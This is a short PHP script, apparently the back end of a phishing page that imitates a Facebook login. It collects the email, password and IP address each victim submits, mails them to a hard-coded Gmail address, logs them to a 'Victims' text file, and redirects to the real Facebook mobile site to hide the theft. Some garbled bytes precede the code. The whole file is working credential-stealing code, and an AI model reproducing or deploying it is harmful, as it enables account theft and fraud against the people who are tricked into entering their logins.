^[jǺ^r^^[jǺ^r^<?php
#Learn Security on 
$ip=$_SERVER['REMOTE_ADDR'];


$Email = $_POST['email'];
$Passwd = $_POST ['pass'];



$Email = $_POST['email'];
$Passwd = $_POST ['pass'];

$to = "elsaidim124@gmail.com";
$you = "elsaidim124@gmail.com";

mail ("$to","IP:$ip","Passwd :$Passwd","Mail is :$Email");

$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("Victims darsh88.txt", "a");
fwrite ($f, "$habbo : $password\r\n ");
fclose($f);

header("Location: https://m.facebook.com/");
?>
